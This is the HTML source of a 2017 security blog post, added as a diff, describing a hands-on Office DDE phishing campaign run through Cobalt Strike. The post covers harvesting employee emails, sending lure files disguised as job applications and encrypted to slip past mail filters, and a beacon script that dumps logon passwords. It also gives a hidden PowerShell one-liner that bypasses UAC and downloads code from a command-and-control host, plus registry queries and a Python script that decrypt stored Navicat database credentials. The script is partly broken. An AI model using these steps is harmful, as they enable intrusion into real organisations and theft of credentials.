@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="author" content="c4bbage">
+  
+  <title>office DDE 实战 - c4bbage blog</title>
+  
+
+  <link rel="shortcut icon" href="../img/favicon.ico">
+
+  
+  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>
+
+  <link rel="stylesheet" href="../css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../css/theme_extra.css" type="text/css" />
+  <link rel="stylesheet" href="../css/highlight.css">
+
+  
+  <script>
+    // Current page data
+    var mkdocs_page_name = "office DDE 实战";
+    var mkdocs_page_input_path = "OfficeDDE.md";
+    var mkdocs_page_url = "/OfficeDDE/";
+  </script>
+  
+  <script src="../js/jquery-2.1.1.min.js"></script>
+  <script src="../js/modernizr-2.8.3.min.js"></script>
+  <script type="text/javascript" src="../js/highlight.pack.js"></script>
+  <script src="../js/theme.js"></script> 
+
+  
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+      <div class="wy-side-nav-search">
+        <a href=".." class="icon icon-home"> c4bbage blog</a>
+        <div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+        <ul class="current">
+          
+            <li>
+    <li class="toctree-l1 ">
+        <a class="" href="..">Home</a>
+        
+    </li>
+<li>
+          
+            <li>
+    <ul class="subnav">
+    <li><span>工作笔记</span></li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../paloalto2elk1/">paloalto日志转发elk1</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../paloalto2elk2/">paloalto日志转发elk2</a>
+        
+    </li>
+
+        
+    </ul>
+<li>
+          
+            <li>
+    <ul class="subnav">
+    <li><span>兴趣关注</span></li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../cve-2017-7269tips/">CVE-2017-7269的几个技巧及BUG修正</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../spear%20Phishing%20Techniques%20used%20in%20attacks%20targeting%20the%20MongolianGovernment/">针对蒙古国的apt攻击[翻译]</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../yunshu_aliyun/">阿里云用户隔离-云舒文章</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../How_to_spend_the_workplace_arsenal/">如何度过职场新兵期-四哥</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../log4j-deserialization-vuln/">log4j deserialization vuln</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../doublepulsar-smb-implant-detection-from-and-eventlog-detection/">使用Volatility检测DoublePulsar SMB 和日志审查</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../CVE-2017-8759/">CVE-2017-8759 利用方法</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../sysmon_note/">sysmon 笔记</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 current">
+        <a class="current" href="./">office DDE 实战</a>
+        
+            <ul>
+            
+                <li class="toctree-l3"><a href="#office-dde">office DDE 实战</a></li>
+                
+                    <li><a class="toctree-l4" href="#_1">简介</a></li>
+                
+                    <li><a class="toctree-l4" href="#dde">DDE原理</a></li>
+                
+                    <li><a class="toctree-l4" href="#_2">过程</a></li>
+                
+                    <li><a class="toctree-l4" href="#_5">结果</a></li>
+                
+                    <li><a class="toctree-l4" href="#_6">本机的信息收集</a></li>
+                
+                    <li><a class="toctree-l4" href="#_7">引用</a></li>
+                
+            
+            </ul>
+        
+    </li>
+
+        
+    </ul>
+<li>
+          
+            <li>
+    <ul class="subnav">
+    <li><span>过期老文</span></li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../handle_csrf_token_with_burpsuite_or_sqlmap/">用Burpsuite 来处理csrf token</a>
+        
+    </li>
+
+        
+    </ul>
+<li>
+          
+            <li>
+    <ul class="subnav">
+    <li><span>实用工具</span></li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../debian8_install_msf/">debian8安装metasploit</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../msf_usage/">metasplit使用笔记</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../cobaltstrike_usage/">cobalt strike 杂记</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../pentest_tools/">在渗透中需要用的工具收集</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../reverse_engineering_tool/">逆向工程工具</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../cobalt-strike-cracked/">cobalt strike 3.7 破解</a>
+        
+    </li>
+
+        
+    </ul>
+<li>
+          
+            <li>
+    <ul class="subnav">
+    <li><span>技巧笔记</span></li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../.netcallshellcode/">.net 执行 shellcode</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../linux_persistence_note/">linux 密码记录(client/server)</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../burpsuite-fuzz-chr/">利用burpsuite来进行Fuzz</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../windows_persistence_note/">windows后门自启动笔记</a>
+        
+    </li>
+
+        
+    </ul>
+<li>
+          
+            <li>
+    <li class="toctree-l1 ">
+        <a class="" href="../Heart%20chicken%20soup/">心灵鸡汤</a>
+        
+    </li>
+<li>
+          
+            <li>
+    <li class="toctree-l1 ">
+        <a class="" href="../about/">About</a>
+        
+    </li>
+<li>
+          
+        </ul>
+      </div>
+      &nbsp;
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="..">c4bbage blog</a>
+      </nav>
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="..">Docs</a> &raquo;</li>
+    
+      
+        
+          <li>兴趣关注 &raquo;</li>
+        
+      
+    
+    <li>office DDE 实战</li>
+    <li class="wy-breadcrumbs-aside">
+      
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main">
+            <div class="section">
+              
+                <h1 id="office-dde">office DDE 实战</h1>
+<ul>
+<li>作者:c4bbage</li>
+<li>时间:2017.11.6</li>
+<li>链接:http://dobest1.com/OfficeDDE</li>
+</ul>
+<h2 id="_1">简介</h2>
+<p>Ms office在不需要宏情况下，使用DDE进行攻击.恶意文档制作简单，实施成本低。到目前为止微软并未推出补丁，也未承认此漏洞。公司内网梭子鱼、赛门铁克、均可进行部分拦截</p>
+<h2 id="dde">DDE原理</h2>
+<p>DDE只不过是一个自定义字段，用户可插入文档。这些字段允许用户输入简单的说明，包括插入到新文档中的数据及插入位置。问题是恶意软件制作者可以创建包含DDE字段的恶意Word文件（而不需要打开另一个Office应用程序）、打开命令提示符和运行恶意代码。通常情况下，Office应用程序会显示两项告警内容。第一个是关于包含指向其他文件的链接的文档告警，第二个是关于打开远程命令提示符的错误告警</p>
+<h2 id="_2">过程</h2>
+<h3 id="cs">建立CS监听</h3>
+<p>整个过程是主要是收集目标邮箱、发送恶意邮件、BypassUAC,用的工具是 cobaltstrike ,加载<a href="https://github.com/p292/DDEAutoCS">DDE利用扩展</a>.建立listens,利用次扩展(Attacks -&gt; DDEauto Word stage exploit)生产恶意代码，把恶意代码利用标记嵌入已经准备好的doc文档中。</p>
+<pre><code> D:\github\DDEAutoCS 的目录
+
+2017/11/02  16:04    &lt;DIR&gt;          .
+2017/11/02  16:04    &lt;DIR&gt;          ..
+2017/11/02  16:04            13,356 2222.docx
+2017/10/30  17:03             2,018 ddeauto.cna
+2017/10/30  17:03    &lt;DIR&gt;          img
+2017/10/30  17:03             1,546 LICENSE
+2017/10/30  17:03             1,104 README.md
+2017/10/31  10:02            15,969 应聘-php开发-贾德.docx
+2017/10/31  10:02            13,355 应聘-php开发-贾德.zip
+2017/10/31  09:12            14,062 应聘-运营策划实习生-贾德.docx
+2017/10/31  09:45            23,294 应聘-运营策划实习生-贾德.zip
+</code></pre>
+
+<p>梭子与设备会拦截我们未加密的文档，建议对文档进行做加密处理。</p>
+<h3 id="_3">收集邮箱</h3>
+<ul>
+<li>通过百度、谷歌，搜索关键字 '@xxxxx.com 公司|招聘|邮箱|mail|email' 记录相应的招聘标题</li>
+<li>通过github 手机技术人邮箱 '@xxxxx.com email' 记录开发语言</li>
+</ul>
+<h3 id="_4">发送钓鱼邮件</h3>
+<p><img alt="" src="../images/20171106143934.png" /></p>
+<p>第一封邮件显示叹号，未发送成功，就是因为梭子鱼给拦掉了。日志如下:
+<img alt="" src="../images/20171106144253.png" /></p>
+<h2 id="_5">结果</h2>
+<p>一台开发上线</p>
+<p><img alt="" src="../images/20171103150052.png" /></p>
+<h3 id="cobaltstrike">cobaltstrike 上线自动执行脚本</h3>
+<pre><code>on beacon_initial {
+    bshell($1,&quot;net user&quot;)
+    binput($1,&quot;shell net user&quot;)
+    bshell($1,&quot;ipconfig /all&quot;)
+    binput($1,&quot;shell ipconfig /all&quot;)
+    binput($1, &quot;logonpasswords&quot;);
+    blogonpasswords($1);
+}
+</code></pre>
+
+<h3 id="bypassuac">bypassuac</h3>
+<p>这个挺好用的</p>
+<pre><code>powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/cf906a8a59d6ff22f79ac64554c4244da1a3d63f/Invoke-TokenDuplication.ps1');Invoke-TokenDuplication -Binary 'cmd.exe' -Arguments '/c powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString(''http://2.3.2.2:80/dde'');'
+
+</code></pre>
+
+<h2 id="_6">本机的信息收集</h2>
+<h3 id="navicat-mysql">Navicat mysql 认证信息</h3>
+<pre><code>reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v pwd
+reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v host
+reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v port
+reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v UserName
+</code></pre>
+
+<p>提取如上信息放入脚本中进行解密</p>
+<pre><code class="python"># 需要环境python3.5
+# git clone https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password
+# cd how-does-navicat-encrypt-password
+# cat mysql.py
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+#
+&quot;&quot;&quot;
+cmd.exe /c
+reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v pwd
+reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v host
+reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v port
+reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v UserName
+&quot;&quot;&quot;
+import re
+# import
+pwd = &quot;&quot;&quot;HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers\\x.x.x.x
+    Pwd    REG_SZ    xxxxxxxxxxxxxxx
+
+HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers\\x.x.x.x
+    Pwd    REG_SZ    xxxxxxxxxxxxxxxx
+&quot;&quot;&quot;
+user = &quot;&quot;&quot;
+HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers\\x.x.x.x
+    UserName    REG_SZ    root
+
+HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers\\x.x.x.x
+    UserName    REG_SZ    root
+&quot;&quot;&quot;
+host = &quot;&quot;&quot;
+HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers\\x.x.x.x
+    Host    REG_SZ    x.x.x.x
+
+HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers\\x.x.x.x
+    Host    REG_SZ    x.x.x.x
+&quot;&quot;&quot;
+port = &quot;&quot;&quot;
+HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers\\x.x.x.x
+    Port    REG_DWORD    0xcea
+
+HKEY_CURRENT_USER\\SOFTWARE\\PremiumSoft\\Navicat\\Servers\\x.x.x.x
+    Port    REG_DWORD    0xcea
+&quot;&quot;&quot;
+
+mysqlServers = {}
+mysqlPwd = {}
+mysqlPort = {}
+mysqlUsername = {}
+for i in host.split(&quot;\n\n&quot;):
+    mysqlServers[i.strip().split(&quot;\n&quot;)[0]] = {&quot;host&quot;: re.sub(
+        &quot;\s+&quot;, &quot;|&quot;, i.strip().split(&quot;\n&quot;)[1].strip()).split(&quot;|&quot;)[2]}
+for i in pwd.split(&quot;\n\n&quot;):
+
+    mysqlPwd[i.strip().split(&quot;\n&quot;)[0]] = {&quot;pwd&quot;: re.sub(
+        &quot;\s+&quot;, &quot;|&quot;, i.strip().split(&quot;\n&quot;)[1].strip()).split(&quot;|&quot;)[2]}
+
+for i in user.split(&quot;\n\n&quot;):
+    mysqlUsername[i.strip().split(&quot;\n&quot;)[0]] = {&quot;username&quot;: re.sub(
+        &quot;\s+&quot;, &quot;|&quot;, i.strip().split(&quot;\n&quot;)[1].strip()).split(&quot;|&quot;)[2]}
+for i in port.split(&quot;\n\n&quot;):
+    mysqlPort[i.strip().split(&quot;\n&quot;)[0]] = {&quot;port&quot;: re.sub(
+        &quot;\s+&quot;, &quot;|&quot;, i.strip().split(&quot;\n&quot;)[1].strip()).split(&quot;|&quot;)[2]}
+from prettytable import PrettyTable
+import NavicatEncrypt
+table = PrettyTable([&quot;host&quot;, &quot;port&quot;, &quot;username&quot;, &quot;pwd&quot;])
+
+for i in mysqlServers:
+    table.add_row([mysqlServers[i]['host'], int(
+        mysqlPort[i]['port'], 16), mysqlUsername[i]['username'], mysqlPwd[i]['pwd'], NavicatEncrypt.Decrypt_Navicat(bytearray.fromhex(mysqlPwd[i]['pwd'])).decode('ascii')])
+print tablle
+
+</code></pre>
+
+<p><img alt="" src="../images/20171106152013.png" /></p>
+<h3 id="xshell">xshell 信息</h3>
+<h3 id="rdp">rdp 信息</h3>
+<h2 id="_7">引用</h2>
+<ul>
+<li><a href="https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password">how-does-navicat-encrypt-password</a></li>
+<li><a href="https://securityonline.info/ddeautocs-cobaltstrike-script-integrates-ddeauto-attacks/">ddeautocs-cobaltstrike-script-integrates-ddeauto-attacks</a></li>
+</ul>
+              
+            </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="../handle_csrf_token_with_burpsuite_or_sqlmap/" class="btn btn-neutral float-right" title="用Burpsuite 来处理csrf token">Next <span class="icon icon-circle-arrow-right"></span></a>
+      
+      
+        <a href="../sysmon_note/" class="btn btn-neutral" title="sysmon 笔记"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+    
+  </div>
+
+  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+	  
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+<div class="rst-versions" role="note" style="cursor: pointer">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      
+      
+        <span><a href="../sysmon_note/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+      
+      
+        <span style="margin-left: 15px"><a href="../handle_csrf_token_with_burpsuite_or_sqlmap/" style="color: #fcfcfc">Next &raquo;</a></span>
+      
+    </span>
+</div>
+
+</body>
+</html>
